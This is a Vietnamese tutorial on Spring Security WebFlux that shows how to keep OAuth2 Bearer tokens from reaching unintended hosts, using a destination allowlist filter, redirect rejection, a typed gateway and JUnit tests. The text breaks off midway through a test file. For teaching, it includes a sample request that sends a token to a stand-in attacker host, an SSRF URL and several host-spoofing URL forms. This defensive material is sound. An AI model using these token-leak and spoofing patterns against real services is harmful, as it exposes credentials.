# Giới hạn máy chủ đích để tránh gửi Bearer token nhầm dịch vụ

## 1. Mục tiêu và tình huống bảo mật

Trong **Spring Security Reactive (WebFlux)**, ứng dụng có thể dùng OAuth2 Client lấy access token rồi gọi Resource Server qua `WebClient`. Spring Security có `ServerOAuth2AuthorizedClientExchangeFilterFunction` để gắn token vào outbound request:

```http
GET /v1/invoices/42 HTTP/1.1
Host: api.billing.example.invalid
Authorization: Bearer <access-token>
```

Nếu cùng client gọi sang một host ngoài dự kiến, chẳng hạn do URL được nhập từ phía người dùng, cấu hình mặc định gắn token quá rộng hoặc redirect không được kiểm soát, header đó có thể tới **một dịch vụ không được ủy quyền nhận token**:

```http
GET /collect HTTP/1.1
Host: attacker.example.invalid
Authorization: Bearer <access-token>
```

Hai đoạn HTTP chỉ minh họa rủi ro; giá trị trong ngoặc nhọn không phải credential thật. Với Bearer token, một bên giữ được token có thể trình nó với Resource Server theo phạm vi quyền mà token mang. Do đó việc gửi nhầm token là một sự cố bảo mật, kể cả khi HTTP response của request là 404/500.

**Bài học:** Giới hạn máy chủ đích để tránh gửi Bearer token nhầm dịch vụ.  
**Ngữ cảnh:** OAuth2 Client.  
**Module:** Spring Security - reactive.  
**Môi trường thực hành:** Java 17+, Spring Boot 3.5.x, Spring Security 6.5.x, Reactor Netty.

Sau bài, bạn có thể:

1. Giải thích tại sao access token chỉ nên đến **Resource Server được dự định**, không tự chuyển sang API khác.
2. Phân biệt `ClientRegistration`, `OAuth2AuthorizedClient`, `ReactiveOAuth2AuthorizedClientManager`, `ServerOAuth2AuthorizedClientExchangeFilterFunction` và `WebClient`.
3. Nhận biết nguy cơ của `setDefaultOAuth2AuthorizedClient(true)`, `setDefaultClientRegistrationId(...)`, `defaultHeader(Authorization, ...)` và WebClient dùng chung.
4. Kiểm tra URI cuối cùng bằng **HTTPS scheme + exact hostname + port + userinfo/fragment**, không dùng `contains`/`endsWith` tùy tiện.
5. Đặt allowlist guard **trước OAuth2 filter** để chặn request sai ngay cả trước khi manager được gọi.
6. Hiểu vì sao `baseUrl` không tự khóa absolute URI, và vì sao redirect tự động có thể đi bên dưới tầng WebClient filter.
7. Bật `followRedirect(false)`, từ chối hoặc xử lý 3xx có kiểm soát và không relay Authorization mù.
8. Phân tách outbound client có Bearer token khỏi client public, và cung cấp gateway method nhận ID thay vì arbitrary URL.
9. Hiểu giới hạn hostname policy trước DNS rebinding, SSRF, proxy/mTLS, shared host, resource-server audience và scope.
10. Kiểm thử offline với fake `ReactiveOAuth2AuthorizedClientManager` và fake `ExchangeFunction` để xác minh token chỉ được attach khi destination hợp lệ.
11. Bổ sung TLS, audience restriction, least privilege, log redaction, network egress ACL và các negative tests trước production.

Các hostname `example.invalid` chỉ là **địa chỉ ví dụ không hoạt động**. Demo ứng dụng có `GET /health` chạy được, và các JUnit tests dùng fake transport thay cho mạng thật. Muốn gọi Billing API thực cần Authorization Server/Resource Server được cấu hình và cấp token đúng; bài không giả vờ một request với fake provider có thể thành công.

## 2. Bearer token và ranh giới ủy quyền

### 2.1. Access token không phải một header trung tính

OAuth2 Bearer token thường được gửi như sau:

```http
Authorization: Bearer eyJ...
```

Chuỗi access token có thể là JWT hoặc opaque token. Đối với bearer token, ai giữ nó có thể trình nó; việc chữ ký JWT hợp lệ không ngăn kẻ khác **replay token** khi Resource Server chấp nhận token. Token cần được giữ kín, dùng TLS, giới hạn thời gian sống, scope và audience. Sender-constrained tokens như mTLS/DPoP có thể giảm rủi ro replay theo threat model, nhưng không phải giấy phép để gửi token đến host tùy ý.

Theo RFC 6750, phải bảo vệ token khỏi người nhận không dự kiến và không chuyển Bearer token vào URL query vì browser history, proxy logs và các nơi khác có thể lưu URL. Trong outbound HTTP, dùng header Authorization chỉ với **destination tin cậy**.

### 2.2. Target origin gồm scheme, host, port

```text
https://api.billing.example.invalid:443/v1/invoices/42?format=json
  |                 |           |       |
  scheme            hostname    port    path + query
```

Policy thực hành chỉ chấp nhận:
- Scheme `https`; không chấp nhận `http` hoặc downgrade.
- Host `api.billing.example.invalid` **exact** (không prefix/suffix).
- Port HTTPS mặc định hoặc tường minh 443.
- Không có URI userinfo (dạng `user@host`).
- Không có fragment.
- Không tự động follow HTTP redirects sang nơi khác.
- Chọn `clientRegistrationId("billing-api")` rõ tại call site.

Nếu cùng origin có nhiều API/tenant, chỉ kiểm tra host là **chưa đủ**: cần thêm path/service policy, identity/resource audience, ACL và quyền tenant. Trong production, DNS/IP/egress policy là lớp chốt sau URL guard.

### 2.3. Các lớp bảo vệ bổ sung

| Lớp | Mục tiêu | Không giải quyết một mình |
|---|---|---|
| ClientRegistration | Chọn client, grant type, AS token endpoint, scopes | Không định nghĩa mọi host Resource Server được nhận token |
| Authorized Client | Chứa OAuth2AccessToken và principal/registration | Không kiểm tra URL đang gọi |
| Destination allowlist | Chặn sai scheme/hostname/port | Không khóa được DNS/IP hoặc shared API path |
| WebClient filter order | Đảm bảo chặn trước khi OAuth2 gắn token | Không bao trùm internal redirect của HTTP transport |
| Redirect policy | Không tự nối request sang host mới | Không bảo vệ SSRF qua một URL đầu đã sai |
| TLS | Bảo vệ kênh truyền, xác minh certificate và hostname | Không ngăn gửi token tới host attacker có TLS hợp lệ |
| Network egress ACL | Chặn kết nối ngoài IP/network được phép | Không thay authorization/resource audience |
| Token audience | Token chỉ hợp lệ ở resource server được cấp | Không ngăn attacker nhìn thấy token bị gửi nhầm |
| Scope và TTL | Giảm hành động và cửa sổ rủi ro | Không sửa được lộ secret |
| Log redaction | Ngăn token bị ghi vào logs/traces | Không ngăn HTTP request sai destination |

## 3. WebClient OAuth2 integration thực hiện những gì?

### 3.1. ServerOAuth2AuthorizedClientExchangeFilterFunction

Ở Spring WebFlux 6.5, Spring Security cung cấp filter:

```text
org.springframework.security.oauth2.client.web.reactive.function.client
    .ServerOAuth2AuthorizedClientExchangeFilterFunction
```

Cấu hình đơn giản theo tài liệu:

```java
ServerOAuth2AuthorizedClientExchangeFilterFunction oauth2 =
    new ServerOAuth2AuthorizedClientExchangeFilterFunction(
        authorizedClientManager);

WebClient outbound = WebClient.builder()
    .filter(oauth2)
    .build();
```

Đây là **snippet**, cần imports và bean manager. OAuth2 filter tìm authorized client, xin hoặc làm mới access token theo manager/provider thích hợp, rồi đưa nó vào HTTP Authorization header. Filter này không tự thay bạn quyết định **hostname nào là resource server nhận token**.

### 3.2. Chọn authorized client một cách tường minh

```java
// Snippet trong service; import static clientRegistrationId(...) tương ứng.
return billingWebClient.get()
    .uri("/v1/invoices/{id}", invoiceId)
    .attributes(clientRegistrationId("billing-api"))
    .retrieve()
    .bodyToMono(String.class);
```

`clientRegistrationId("billing-api")` chỉ định client registration để manager chọn token. Nó **không chứng minh URI đúng host**. Nếu code cho phép URI tuyệt đối hoặc arbitrary URL, request vẫn có thể mang token tới đích trái quyền nếu không có guard.

Có một API khác là `oauth2AuthorizedClient(authorizedClient)` để truyền đối tượng đã được cấp quyền vào request attributes. Cả hai hình thức đều yêu cầu **destination policy**; không phải token được chọn rõ thì bất kỳ hostname nào cũng được phép.

### 3.3. Cảnh báo setDefaultOAuth2AuthorizedClient(true)

Mẫu dễ gây rò:

```java
var oauth2 =
    new ServerOAuth2AuthorizedClientExchangeFilterFunction(manager);
oauth2.setDefaultOAuth2AuthorizedClient(true);

WebClient shared = WebClient.builder()
    .filter(oauth2)
    .build();
```

Khi user đã đăng nhập bằng `oauth2Login` và OAuth2 authorized client có thể được xác định từ Authentication hiện tại, Spring Security có thể tự dùng token của người dùng cho **tất cả HTTP requests qua WebClient này**. Tài liệu Spring Security 6.5 ghi rõ phải thận trọng vì access token có thể được gắn lên mọi request.

Nếu developer dùng `shared` để gọi API phân tích, webhook, URL từ input user hoặc metadata endpoint ngoài ý muốn, token có nguy cơ tới người nhận sai. **Đừng bật default này trên WebClient đa dụng.**

### 3.4. Default registration cũng không khóa máy chủ

```java
oauth2.setDefaultClientRegistrationId("billing-api");
```

Cấu hình này xác định token mặc định theo registration, **không** nói “chỉ gắn nếu Host thuộc Billing API”. Spring Security cảnh báo tương tự khi mọi outbound request qua filter có thể nhận token. Nên chọn registration tại những call sites đã được kiểm soát và ràng buộc destination trước OAuth2 filter.

### 3.5. Không đặt global Authorization default header

Ví dụ thiết kế lỗi:

```java
WebClient unsafe = WebClient.builder()
    .defaultHeader("Authorization", "Bearer " + accessToken)
    .build();
```

Mỗi request dùng client có thể mang cùng token, kể cả request sai host, khác user hoặc khi token đã hết hạn. Không dùng `defaultHeader` chung để relay Bearer token; thay vào đó dùng OAuth2 manager, call-site registration và destination guard.

### 3.6. Client credentials và user delegation

- `authorization_code` thường dùng khi browser user đăng nhập/ủy quyền, token có thể liên kết resource owner.
- `client_credentials` cấp quyền cho **dịch vụ**, không tự có user identity.
- `ReactiveOAuth2AuthorizedClientManager` thực hiện authorize/re-authorize, chọn provider và persistence behavior.
- `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` phù hợp background service-to-service không có inbound `ServerWebExchange`.
- `DefaultReactiveOAuth2AuthorizedClientManager` được thiết kế cho bối cảnh WebExchange và thích hợp flows tương ứng.
- Không lấy user token từ Reactor Context rồi relay tự động tới mọi service.
- Nếu API cần quyền theo user, dùng delegation/token exchange được hỗ trợ và scope/audience đúng.

## 4. Những kiểu lỗi khiến token đi nhầm dịch vụ

### 4.1. URL do caller quyết định (SSRF)

```text
GET /fetch?url=https://attacker.example.invalid/collect
```

Controller sai:

```java
// Snippet thiết kế lỗi.
return shared.get()
    .uri(userSuppliedUrl)
    .retrieve()
    .bodyToMono(String.class);
```

Nếu `shared` có OAuth2 filter tự gắn Bearer token, attacker có thể nhận token. Đây còn là **Server-Side Request Forgery** vì backend truy cập URL do người bên ngoài điều khiển.

Ưu tiên một gateway API dạng `findInvoice(id)`, nơi destination do **server cố định** và chỉ path variable được nhận. Nếu sản phẩm thực sự cần URL động, phải thiết kế URL allowlist, DNS/IP validation, egress ACL, resource limits, chống redirect và **không sử dụng token billing-api** cho URL không thuộc Billing Resource Server.

### 4.2. baseUrl không phải security boundary

```java
WebClient client = WebClient.builder()
    .baseUrl("https://api.billing.example.invalid")
    .build();

// Relative request dùng base URL:
client.get().uri("/v1/invoices");

// Absolute URI có thể override baseUrl:
client.get().uri("https://attacker.example.invalid/collect");
```

Đây là snippet. Không thể chỉ đặt `baseUrl` rồi tin mọi URL sẽ luôn thuộc host đó. Hãy kiểm tra **`ClientRequest.url()` sau URI resolution**.

### 4.3. So URL bằng contains/endsWith rất nguy hiểm

```java
boolean allowed = rawUrl.contains("api.billing.example.invalid");
```

Có thể bị đánh lừa bởi:

```text
https://api.billing.example.invalid.attacker.invalid/
https://attacker.invalid/?continue=api.billing.example.invalid
https://api.billing.example.invalid@attacker.invalid/path
http://api.billing.example.invalid/
https://api.billing.example.invalid:8443/
```

Trong URL có `@`, phần bên trái là **userinfo**, không phải host của request. Dùng `java.net.URI` parse và so `getHost()` exact, scheme/port/userinfo. Nếu nhận hostname IDN, production cần Unicode normalization/punycode cùng chính sách chặt; bài dùng hostname ASCII cố định.

### 4.4. Redirect 301/302/303/307/308

Một resource server đúng host có thể trả:

```http
HTTP/1.1 302 Found
Location: https://attacker.example.invalid/collect
```

Nếu underlying HTTP client auto-follow redirects, một filter kiểm tra **request ban đầu** không nhất thiết thấy được từng hop kế tiếp. Không nên giả định HTTP client/proxy nào cũng xử lý Authorization header giống nhau trên redirect cross-origin.

Mô hình fail-closed:

1. `HttpClient.followRedirect(false)`.
2. Đối với outbound API mang Bearer token, coi 3xx bất ngờ là lỗi và không follow `Location`.
3. Nếu thực sự cần follow, chỉ làm bằng một cơ chế **per-hop allowlist** và có quyết định rõ ràng về Authorization; không copy bearer token mù.
4. Từ chối HTTPS → HTTP, host ngoài allowlist và port khác.
5. Test redirect chain trên transport/proxy thật; unit test mock `ExchangeFunction` không bao trùm auto redirect dưới tầng Netty.

### 4.5. Shared host và sai tenant

Giả sử cùng origin:

```text
https://api.company.invalid/billing/v1/...
https://api.company.invalid/hr/v1/...
```

Host đúng chưa chứng minh token Billing được gửi cho path HR. Với shared host:
- Không nhận arbitrary path từ caller.
- Typed gateway chỉ dựng các routes đã định.
- Có thể kiểm tra path prefix đã được **canonicalize** và tránh encoded path traversal nếu dùng custom path guard.
- Token có `aud` đúng resource hoặc tenant, scope chỉ gồm quyền cần thiết.
- Resource Server validate issuer/audience/scope/ACL.
- Ưu tiên phân tách hostname/service identity cho các hệ thống bảo mật khác nhau.

Không dùng `startsWith("/billing")` một cách ngây thơ vì có thể match `/billing-admin`; nếu phải kiểm tra path, yêu cầu chuẩn hóa và boundary segment đúng.

## 5. Kiến trúc an toàn hơn

### 5.1. Một WebClient cho một resource server

```text
BillingGateway
  |
  +-- billingApi WebClient
        +-- baseUrl cố định
        +-- DestinationGuard HTTPS exact host:443
        +-- OAuth2 filter explicit clientRegistrationId
        +-- RejectRedirectsFilter
        +-- Reactor Netty followRedirect(false)
        +-- chỉ gửi Bearer tới Billing Resource Server

PublicCatalogGateway
  |
  +-- publicHttp WebClient
        +-- không có OAuth2 filter
        +-- không default Authorization

Authorization Server token endpoint:
  đi qua OAuth2AuthorizedClientManager / token client riêng
  có chính sách TLS/egress tin cậy riêng
```

Nên inject **typed BillingGateway**, không phơi một WebClient đa dụng ra mọi service. Nếu cần Analytics API có token, tạo client/registration/guard riêng, không tái sử dụng Billing token.

### 5.2. Guard phải chạy trước OAuth2 filter

```text
WebClient request (URI đã resolve)
           |
           v
DestinationGuard
  | sai URI -> Mono.error, không gọi manager/HTTP transport
  | đúng URI
           v
ServerOAuth2AuthorizedClientExchangeFilterFunction
  -> manager tìm hoặc cấp/refresh token
  -> header Authorization: Bearer ...
           |
           v
RejectRedirectsFilter
           |
           v
HttpClient.followRedirect(false)
           |
           v
Trusted Resource Server
```

Đăng ký filters theo thứ tự đó giúp kiểm tra host trước khi chạm token. Không giả định builder `baseUrl` hay registrationId mặc định tạo sẵn origin guard.

### 5.3. Kiểm soát DNS/IP và proxy

Chỉ kiểm tra hostname là một **lớp**, chưa bao trùm:
- DNS rebinding: hostname đúng nhưng IP được resolve thành private/link-local/loopback hoặc đổi giữa các thời điểm.
- Egress proxy/service mesh chuyển tiếp đến endpoint khác.
- Cấu hình `trustAll` hoặc bỏ TLS hostname/certificate check.
- Shared endpoint có virtual hosts/tenants/path khác nhau.
- HTTP client khác (SDK, RestClient, gRPC) không dùng guard đã viết.
- Background job xây WebClient mới bỏ filters.
- Token rò qua logs/traces/APM.

Production cần DNS resolver đáng tin, mạng egress chỉ cho các IP/services đã duyệt, chặn metadata service và private IP trái policy, TLS hostname validation, service identities và log redaction. Không cấp quyền arbitrary host do user nhập vào allowlist chỉ để request chạy thành công.

## 6. Token audience, scope và giới hạn thiệt hại

### 6.1. Audience không phải hostname guard

- `scope=invoice.read` giới hạn **hành động**.
- `aud=billing-api` giới hạn **resource server**.
- `iss` xác định Authorization Server đáng tin.
- Token TTL giới hạn khoảng thời gian token có hiệu lực.
- Host allowlist giới hạn **nơi client gửi token**.

Token có audience đúng vẫn có thể bị **đánh cắp** nếu client gửi nhầm đến attacker. Audience restriction giúp giảm nơi có thể **sử dụng thành công** token, không ngăn lộ chuỗi token. Resource Server phải thực hiện audience validation chứ không chỉ kiểm tra chữ ký JWT.

### 6.2. RFC 8707 Resource Indicators

RFC 8707 cung cấp tham số `resource` để client báo cho Authorization Server resource nào được dự định nhận token, ví dụ:

```text
resource=https://api.billing.example.invalid/
scope=invoice.read
```

Authorization Server có thể audience-restrict token cho resource này. Nhưng **không phải mọi IdP hỗ trợ RFC 8707**; cần xem provider-specific configuration. Không tự thêm `resource` vào request tới Resource Server rồi tưởng audience token thay đổi.

### 6.3. Nếu có nhiều downstream resource servers

Thường nên xin token **riêng theo audience**:
- billing-api: `aud=billing`, scope `invoice.read`.
- hr-api: `aud=hr`, scope `employee.read`.
- analytics-api: `aud=analytics`, scope tối thiểu.

Không đưa một token nhiều audience/broad scope tới tất cả services trừ khi kiến trúc/threat model được chấp thuận. Với multi-tenant, token audience/resource path có thể cần chứa tenant context để Resource Server ngăn dùng token giữa tenants.

## 7. Project Spring Boot 3.x + WebFlux + OAuth2 Client

### 7.1. Dependencies

Tạo dự án Gradle Groovy bằng Spring Initializr, chọn Java 17+, Spring Boot 3.5.x, Spring Reactive Web, Spring Security, OAuth2 Client, Test.

Phần `dependencies` của `build.gradle`:

```groovy
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-webflux'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'

    testImplementation 'org.springframework.boot:spring-boot-starter-test'
    testImplementation 'org.springframework.security:spring-security-test'
    testImplementation 'io.projectreactor:reactor-test'
    testRuntimeOnly 'org.junit.platform:junit-platform-launcher'
}
```

Đây là block dependencies, **không phải toàn bộ build.gradle**. Giữ plugin Spring Boot, dependency management, toolchain, repositories và Gradle wrapper từ Initializr. Tránh thêm `spring-boot-starter-web` khi muốn inbound WebFlux, vì MVC thường được ưu tiên nếu cả hai starters tồn tại trong Boot 3.x.

Cấu trúc:

```text
src/main/java/demo/tokenbound/
  TokenBoundApplication.java
  DestinationGuard.java
  RejectRedirectsFilter.java
  OAuthClientConfig.java
  BillingGateway.java
  HealthController.java
src/test/java/demo/tokenbound/
  DestinationGuardTests.java
  OAuthClientBoundaryTests.java
```

### 7.2. TokenBoundApplication.java

```java
package demo.tokenbound;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class TokenBoundApplication {

    public static void main(String[] args) {
        SpringApplication.run(TokenBoundApplication.class, args);
    }
}
```

### 7.3. DestinationGuard.java

File `src/main/java/demo/tokenbound/DestinationGuard.java`:

```java
package demo.tokenbound;

import java.net.URI;
import java.util.Locale;

import org.springframework.web.reactive.function.client.ClientRequest;
import org.springframework.web.reactive.function.client.ClientResponse;
import org.springframework.web.reactive.function.client.ExchangeFilterFunction;
import org.springframework.web.reactive.function.client.ExchangeFunction;
import reactor.core.publisher.Mono;

public final class DestinationGuard
        implements ExchangeFilterFunction {

    public static final class DestinationRejectedException
            extends IllegalArgumentException {
        public DestinationRejectedException() {
            super("Outbound destination is not allowed");
        }
    }

    private final String trustedHost;

    public DestinationGuard(URI trustedOrigin) {
        if (trustedOrigin == null
                || trustedOrigin.getHost() == null
                || !"https".equalsIgnoreCase(trustedOrigin.getScheme())
                || trustedOrigin.getPort() != -1
                || trustedOrigin.getRawUserInfo() != null
                || trustedOrigin.getRawQuery() != null
                || trustedOrigin.getRawFragment() != null
                || (!"/".equals(trustedOrigin.getPath())
                    && !"".equals(trustedOrigin.getPath()))) {
            throw new IllegalArgumentException(
                "Trusted origin must be a bare HTTPS hostname");
        }
        this.trustedHost = trustedOrigin.getHost()
            .toLowerCase(Locale.ROOT);
    }

    public boolean permitted(URI target) {
        if (target == null || !target.isAbsolute()) {
            return false;
        }
        return "https".equalsIgnoreCase(target.getScheme())
            && target.getHost() != null
            && target.getHost().toLowerCase(Locale.ROOT)
                .equals(this.trustedHost)
            && (target.getPort() == -1 || target.getPort() == 443)
            && target.getRawUserInfo() == null
            && target.getRawFragment() == null;
    }

    @Override
    public Mono<ClientResponse> filter(
            ClientRequest request, ExchangeFunction next) {
        if (!permitted(request.url())) {
            return Mono.error(new DestinationRejectedException());
        }
        return next.exchange(request);
    }
}
```

Chú giải:

- `ClientRequest.url()` chứa URI outbound đã được WebClient resolve. Đừng lấy URI gốc dạng string để so `contains`.
- Host so khớp exact và không phân biệt chữ hoa/thường; port không chấp nhận `8443`.
- `getRawUserInfo()==null` chặn URI chứa `name@host`, gồm cả dạng userinfo gây đánh lừa người review.
- Fragment không cần thiết cho HTTP request nên bị từ chối; query có thể có dữ liệu nghiệp vụ nhưng không được mang secret/token.
- Khi URL không hợp lệ, filter trả `Mono.error` **trước** `next.exchange`.
- Exception message cố định không ghi URI hoặc credential.
- Trong production, IDN/punycode, DNS/IP egress policy và path permission là lớp bổ sung. Đoạn code không được gọi là bảo vệ SSRF hoàn chỉnh.

### 7.4. RejectRedirectsFilter.java

File `src/main/java/demo/tokenbound/RejectRedirectsFilter.java`:

```java
package demo.tokenbound;

import org.springframework.web.reactive.function.client.ClientRequest;
import org.springframework.web.reactive.function.client.ClientResponse;
import org.springframework.web.reactive.function.client.ExchangeFilterFunction;
import org.springframework.web.reactive.function.client.ExchangeFunction;
import reactor.core.publisher.Mono;

public final class RejectRedirectsFilter
        implements ExchangeFilterFunction {

    @Override
    public Mono<ClientResponse> filter(
            ClientRequest request, ExchangeFunction next) {
        return next.exchange(request)
            .flatMap(response -> {
                if (response.statusCode().is3xxRedirection()) {
                    return response.releaseBody()
                        .then(Mono.error(new IllegalStateException(
                            "Unexpected outbound redirect")));
                }
                return Mono.just(response);
            });
    }
}
```

Chốt thứ nhất là transport `HttpClient.followRedirect(false)`. Chốt thứ hai là filter từ chối 3xx và `releaseBody()` để giải phóng response body. Kể cả `304 Not Modified` cũng là 3xx và bị từ chối **có chủ đích trong demo**; nếu sản phẩm dùng conditional GET/cache, cần policy đặc biệt thay vì coi mọi 3xx là redirect hoặc success.

### 7.5. OAuthClientConfig.java

File `src/main/java/demo/tokenbound/OAuthClientConfig.java`:

```java
package demo.tokenbound;

import java.net.URI;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.http.client.reactive.ReactorClientHttpConnector;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.oauth2.client.AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.InMemoryReactiveOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistration;
import org.springframework.security.oauth2.client.registration.InMemoryReactiveClientRegistrationRepository;
import org.springframework.security.oauth2.client.registration.ReactiveClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.security.oauth2.core.AuthorizationGrantType;
import org.springframework.security.oauth2.core.ClientAuthenticationMethod;
import org.springframework.security.web.server.SecurityWebFilterChain;
import org.springframework.web.reactive.function.client.WebClient;

import reactor.netty.http.client.HttpClient;

@Configuration
public class OAuthClientConfig {

    public static final URI BILLING_ORIGIN =
        URI.create("https://api.billing.example.invalid");

    @Bean
    ReactiveClientRegistrationRepository registrations() {
        ClientRegistration billing =
            ClientRegistration.withRegistrationId("billing-api")
                .clientId("demo-client-not-real")
                .clientSecret("demo-secret-not-real")
                .clientAuthenticationMethod(
                    ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
                .authorizationGrantType(
                    AuthorizationGrantType.CLIENT_CREDENTIALS)
                .tokenUri(
                    "https://auth.billing.example.invalid/oauth/token")
                .scope("invoice.read")
                .clientName("Billing API")
                .build();

        return new InMemoryReactiveClientRegistrationRepository(
            billing);
    }

    @Bean
    ReactiveOAuth2AuthorizedClientService clientService(
            ReactiveClientRegistrationRepository registrations) {
        return new InMemoryReactiveOAuth2AuthorizedClientService(
            registrations);
    }

    @Bean
    ReactiveOAuth2AuthorizedClientManager clientManager(
            ReactiveClientRegistrationRepository registrations,
            ReactiveOAuth2AuthorizedClientService clientService) {
        var provider =
            ReactiveOAuth2AuthorizedClientProviderBuilder.builder()
                .clientCredentials()
                .build();

        var manager =
            new AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager(
                registrations, clientService);
        manager.setAuthorizedClientProvider(provider);
        return manager;
    }

    @Bean("billingApi")
    WebClient billingApi(
            ReactiveOAuth2AuthorizedClientManager manager) {
        var oauth2 =
            new ServerOAuth2AuthorizedClientExchangeFilterFunction(
                manager);

        oauth2.setDefaultOAuth2AuthorizedClient(false);
        // Không cấu hình setDefaultClientRegistrationId(...).

        HttpClient transport = HttpClient.create()
            .followRedirect(false);

        return WebClient.builder()
            .baseUrl(BILLING_ORIGIN.toString())
            .clientConnector(new ReactorClientHttpConnector(transport))
            .filter(new DestinationGuard(BILLING_ORIGIN))
            .filter(oauth2)
            .filter(new RejectRedirectsFilter())
            .build();
    }

    @Bean("publicHttp")
    WebClient publicHttp() {
        return WebClient.builder()
            .clientConnector(new ReactorClientHttpConnector(
                HttpClient.create().followRedirect(false)))
            .build();
    }

    @Bean
    SecurityWebFilterChain inbound(ServerHttpSecurity http) {
        return http
            .authorizeExchange(exchanges -> exchanges
                .pathMatchers(HttpMethod.GET, "/health").permitAll()
                .anyExchange().denyAll())
            .httpBasic(basic -> basic.disable())
            .formLogin(form -> form.disable())
            .build();
    }
}
```

Phân tích:

1. `ReactiveClientRegistrationRepository` định nghĩa một registration sử dụng grant `client_credentials` và scope `invoice.read`.
2. `ReactiveOAuth2AuthorizedClientService` giữ authorized clients tạm trong memory cho demo.
3. `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` xử lý service-to-service không đòi `ServerWebExchange`, dùng `clientCredentials()` provider.
4. Authorization Server token endpoint là **`https://auth.billing.example.invalid/oauth/token`**, khác Resource Server **`https://api.billing.example.invalid`**. Hai outbound domains có trust/egress policies khác nhau.
5. `billingApi` dùng HTTPS base URL, origin guard trước OAuth2 filter, reject 3xx và Netty không tự redirect.
6. `setDefaultOAuth2AuthorizedClient(false)` ngăn dùng token người dùng theo default; **không** gọi `setDefaultClientRegistrationId`.
7. `publicHttp` không có OAuth2 filter nên không gắn token tự động.
8. Security inbound chỉ cho `GET /health`, không có API nhận URL arbitrary từ browser.
9. Các demo credentials và `.invalid` domains **không hoạt động**. Với production, dùng secret manager/env/rotation và endpoint được cấp phép; tuyệt đối không đưa credential thật vào source.

Khi ứng dụng có user browser login, manager trong context của `ServerWebExchange` có thể khác. Đừng copy `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` cho mọi authorization-code flow mà không xem bối cảnh của application. Ngược lại, một cron job không có request scope cũng không nên dựa vào `DefaultReactiveOAuth2AuthorizedClientManager` có yêu cầu exchange context.

### 7.6. BillingGateway.java: method cụ thể, không nhận URL

```java
package demo.tokenbound;

import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.reactive.function.client.WebClient;
import reactor.core.publisher.Mono;

import static org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction.clientRegistrationId;

@Service
public class BillingGateway {

    private final WebClient client;

    public BillingGateway(@Qualifier("billingApi") WebClient client) {
        this.client = client;
    }

    public Mono<String> findInvoice(String invoiceId) {
        if (invoiceId == null
                || !invoiceId.matches("[A-Za-z0-9-]{1,64}")) {
            return Mono.error(new IllegalArgumentException(
                "Invalid invoice identifier"));
        }

        return client.get()
            .uri("/v1/invoices/{id}", invoiceId)
            .attributes(clientRegistrationId("billing-api"))
            .retrieve()
            .bodyToMono(String.class);
    }
}
```

Caller chỉ truyền invoice ID đã được kiểm tra; đích request được cố định ở config. Validation của invoice ID không thay authentication/authorization: Billing Resource Server vẫn phải kiểm tra principal, service identity, audience, scopes và ACL của invoice.

### 7.7. HealthController.java

```java
package demo.tokenbound;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import reactor.core.publisher.Mono;

@RestController
public class HealthController {

    @GetMapping("/health")
    public Mono<String> health() {
        return Mono.just("ok");
    }
}
```

### 7.8. Chạy project

Trong root Gradle:

```bash
./gradlew bootRun
```

PowerShell:

```powershell
.\gradlew.bat bootRun
```

Thử public health:

```bash
curl -i http://localhost:8080/health
```

Phần chính của response dự kiến:

```http
HTTP/1.1 200 OK
Content-Type: text/plain;charset=UTF-8

ok
```

Content-Type, charset, thứ tự và security headers có thể khác theo server/version. Demo health không xin access token và không gọi fake IdP. Để gọi `BillingGateway.findInvoice` thật, cần thay fake endpoints, client credentials, network policies và cấp token đúng audience; không có cách an toàn biến fake Bearer test thành token sản phẩm.

## 8. Tests cho allowlist thuần URI

Tạo file `src/test/java/demo/tokenbound/DestinationGuardTests.java`:

```java
package demo.tokenbound;

import java.net.URI;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class DestinationGuardTests {

    private DestinationGuard guard;

    @BeforeEach
    void setup() {
        guard = new DestinationGuard(
            URI.create("https://api.billing.example.invalid"));
    }

    @Test
    void allowsExactTrustedOrigin() {
        assertTrue(guard.permitted(URI.create(
            "https://api.billing.example.invalid/v1/invoices")));
    }

    @Test
    void allowsExplicitPort443() {
        assertTrue(guard.permitted(URI.create(
            "https://api.billing.example.invalid:443/v1/invoices")));
    }

    @Test
    void rejectsUnrelatedHost() {
        assertFalse(guard.permitted(URI.create(
            "https://attacker.example.invalid/collect")));
    }

    @Test
    void rejectsHostnameSuffixSpoofing() {
        assertFalse(guard.permitted(URI.create(
            "https://api.billing.example.invalid.attacker.invalid/x")));
    }

    @Test
    void rejectsDowngradeToHttp() {
        assertFalse(guard.permitted(URI.create(
            "http://api.billing.example.invalid/v1/invoices")));
    }

    @Test
    void rejectsOtherPort() {
        assertFalse(guard.permitted(URI.create(
            "https://api.billing.example.invalid:8443/")));
    }

    @Test
    void rejectsUserInfo() {
        assertFalse(guard.permitted(URI.create(
            "https://user@api.billing.example.invalid/x")));
    }

    @Test
    void rejectsIpLiteral() {
        assertFalse(guard.permitted(URI.create(
